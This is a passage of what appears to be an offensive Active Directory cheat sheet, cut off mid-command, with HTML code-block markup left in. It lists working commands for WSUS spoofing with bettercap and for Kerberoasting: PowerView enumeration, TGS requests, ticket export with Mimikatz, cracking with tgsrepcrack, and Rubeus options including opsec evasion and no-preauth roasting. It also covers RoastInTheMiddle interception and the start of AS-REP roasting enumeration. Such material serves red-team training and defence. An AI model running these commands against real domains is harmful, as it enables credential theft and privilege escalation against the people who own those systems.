<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 470px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 470.238px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">bettercap <span class="cm-attribute">--iface</span> &lt;network_interface&gt; <span class="cm-attribute">--caplet</span> wsus_spoofing.cap</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<p id="bkmrk-now-wait-for-update-">Now wait for update verification or manually trigger with a GUI access on the machine</p>
<h2 id="bkmrk-domain-privesc">Domain Privesc</h2>
<h3 id="bkmrk-kerberoast">Kerberoast</h3>
<h4 id="bkmrk-find-users-with-spn">Find users with SPN</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 629px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 120px; min-width: 629.476px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#PowerView</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-NetUser</span> <span class="cm-operator">-</span><span class="cm-identifier">SPN</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#ActiveDirectory module</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-ADUser</span> <span class="cm-operator">-</span><span class="cm-keyword">Filter</span> <span class="cm-punctuation">{</span><span class="cm-identifier">ServicePrincipalName</span> <span class="cm-operator">-ne</span> <span class="cm-string">"</span><span class="cm-variable-2">$null</span><span class="cm-string">"</span><span class="cm-punctuation">}</span> <span class="cm-operator">-</span><span class="cm-identifier">Properties</span> <span class="cm-identifier">ServicePrincipalName</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 120px;"></div><div class="CodeMirror-gutters" style="height: 170px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-request-tgs">Request TGS</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 810px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 55px; min-width: 810.429px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">Add-Type</span> <span class="cm-operator">-</span><span class="cm-identifier">AssemblyName</span> <span class="cm-identifier">System</span><span class="cm-punctuation">.</span><span class="cm-identifier">IdentityModel</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">New-Object</span> <span class="cm-identifier">System</span><span class="cm-punctuation">.</span><span class="cm-identifier">IdentityModel</span><span class="cm-punctuation">.</span><span class="cm-identifier">Tokens</span><span class="cm-punctuation">.</span><span class="cm-identifier">KerberosRequestorSecurityToken</span> <span class="cm-operator">-</span><span class="cm-identifier">ArgumentList</span> <span class="cm-string">"SPN/&lt;target&gt;.domain.local"</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 55px;"></div><div class="CodeMirror-gutters" style="height: 105px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<p id="bkmrk-or-request-spnticket">Or <code>Request-SPNTicket</code> with PowerView</p>
<h4 id="bkmrk-export-the-ticket">Export the ticket</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 376px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 376.143px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-Mimikatz</span> <span class="cm-operator">-</span><span class="cm-identifier">Command</span> <span class="cm-string">'"kerberos::list /export"'</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-crack-the-ticket">Crack the ticket</h4>
<p id="bkmrk-many-options-but-thi">Many options but this one works (also john, hashcat, etc...)</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 420px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 419.571px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">python.exe .\tgsrepcrack.py .\wordlist.txt .\ticket.kirbi</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-rubeus">Rubeus</h4>
<p id="bkmrk-rubeus-can-be-used-t">Rubeus can be used to perform all the attack, with more or less opsec</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 441px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 185px; min-width: 441.286px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Kerberoast all the kerberoastable accounts</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.\</span><span class="cm-identifier">Rubeus</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-identifier">kerberoast</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Kerberoast a specified account</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.\</span><span class="cm-identifier">Rubeus</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-identifier">kerberoast</span> <span class="cm-operator">/</span><span class="cm-identifier">user</span><span class="cm-operator">:&lt;</span><span class="cm-identifier">target</span><span class="cm-operator">&gt;</span> <span class="cm-operator">/</span><span class="cm-identifier">outfile</span><span class="cm-operator">:</span><span class="cm-identifier">ticket</span><span class="cm-punctuation">.</span><span class="cm-identifier">kirbi</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Kerberoast with opsec tgtdeleg trick filtering AES accounts</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.\</span><span class="cm-identifier">Rubeus</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-identifier">kerberoast</span> <span class="cm-operator">/</span><span class="cm-identifier">rc4opsec</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 185px;"></div><div class="CodeMirror-gutters" style="height: 235px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h3 id="bkmrk-kerberoast-w%2Fo-creds">Kerberoast w/o creds</h3>
<h4 id="bkmrk-without-pre-authenti">Without pre-authentication</h4>
<p id="bkmrk-if-a-principal-can-a">If a principal can authent without pre-authentication (like AS-REP Roasting), it is possible to use it to launch an <strong>AS-REQ request</strong> (for a TGT) and trick the request to ask for a ST instead for a kerberoastable principal, by modifying the <strong>sname</strong> attribut in the <strong>req-body</strong> part of the request. Full explains <a href="https://www.semperis.com/blog/new-attack-paths-as-requested-sts/">here</a>.</p>
<p id="bkmrk-this-pr-must-be-used"><a href="https://github.com/GhostPack/Rubeus/pull/139">This PR</a> must be used for the moment.</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 825px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 824.905px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.\</span><span class="cm-identifier">Rubeus</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-identifier">kerberoast</span> <span class="cm-operator">/</span><span class="cm-identifier">domain</span><span class="cm-operator">:</span><span class="cm-string">"domain.local"</span> <span class="cm-operator">/</span><span class="cm-identifier">dc</span><span class="cm-operator">:</span><span class="cm-string">"dc.domain.local"</span> <span class="cm-operator">/</span><span class="cm-identifier">nopreauth</span><span class="cm-operator">:</span><span class="cm-string">"user_w/o_preauth"</span> <span class="cm-operator">/</span><span class="cm-identifier">spn</span><span class="cm-operator">:</span><span class="cm-identifier">users</span><span class="cm-punctuation">.</span><span class="cm-identifier">txt</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-with-mitm">With MitM</h4>
<p id="bkmrk-if-no-principal-with">If no principal without pre-authentication are present, it is still possible to intercept the <strong>AS-REQ requests</strong> on the wire (with ARP spoofing for example), and replay them to kerberoast.</p>
<p id="bkmrk-warning-%3A-roastinthe"><strong>WARNING : <code>RoastInTheMiddle.exe</code> is only a PoC for the moment, be carefull with it in prod environment !</strong></p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 905px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 904.524px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.</span><span class="cm-operator">/</span><span class="cm-identifier">RoastInTheMiddle</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-operator">/</span><span class="cm-identifier">listenip</span><span class="cm-operator">:&lt;</span><span class="cm-identifier">attacker_IP</span><span class="cm-operator">&gt;</span> <span class="cm-operator">/</span><span class="cm-identifier">spns</span><span class="cm-operator">:</span><span class="cm-identifier">users</span><span class="cm-punctuation">.</span><span class="cm-identifier">txt</span> <span class="cm-operator">/</span><span class="cm-identifier">targets</span><span class="cm-operator">:&lt;</span><span class="cm-identifier">target_IP_1</span><span class="cm-operator">&gt;</span><span class="cm-punctuation">,</span><span class="cm-operator">&lt;</span><span class="cm-identifier">target_IP_2</span><span class="cm-operator">&gt;</span> <span class="cm-operator">/</span><span class="cm-identifier">dcs</span><span class="cm-operator">:&lt;</span><span class="cm-identifier">DC_IP_1</span><span class="cm-operator">&gt;</span><span class="cm-punctuation">,</span><span class="cm-operator">&lt;</span><span class="cm-identifier">DC_IP_2</span><span class="cm-operator">&gt;</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h3 id="bkmrk-as-rep-roasting">AS-REP Roasting</h3>
<h4 id="bkmrk-enumerate-users">Enumerate users</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 629px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 120px; min-width: 629.476px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#UPowerView:</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-DomainUser</span> <span class="cm-operator">-</span><span class="cm-identifier">KerberosPreuthNotRequired</span> <span class="cm-operator">-</span><span class="cm-identifier">Verbose</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#AD module:</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-ADUser</span> <span class="cm-operator">-</span><span class="cm-keyword">Filter</span> <span 